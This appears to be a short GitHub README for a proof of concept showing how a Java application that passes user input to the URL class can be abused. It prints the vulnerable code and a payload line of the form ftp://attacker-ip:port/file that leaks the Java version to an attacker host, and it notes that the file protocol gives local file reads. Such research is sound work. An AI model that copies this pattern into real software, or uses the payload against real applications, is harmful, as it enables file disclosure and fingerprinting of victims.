# java-file-ftp
POC for leaking java version thrrough file and ftp protocols

Consider a java web application using URL class to make a connection as below


```java
import java.net.*;
import java.io.*;
public class Main
{
      public static void main(String[] args) throws Exception{

            URL url = new URL(attackerinput);
            System.out.println(url.getProtocol());


            StringBuilder stringBuilder = new StringBuilder();

            DataInputStream dis = new DataInputStream(url.openConnection().getInputStream());
            String inputLine;

            while ((inputLine = dis.readLine()) != null) {
                System.out.println(inputLine);
            }
            dis.close();

        }
}

```

we can get an LFI using file protocol and also we can get the java version of the running application using file or ftp 

so our attackerinput will be ftp://attacker-ip:port/file or file://attacker-ip:port/file . 



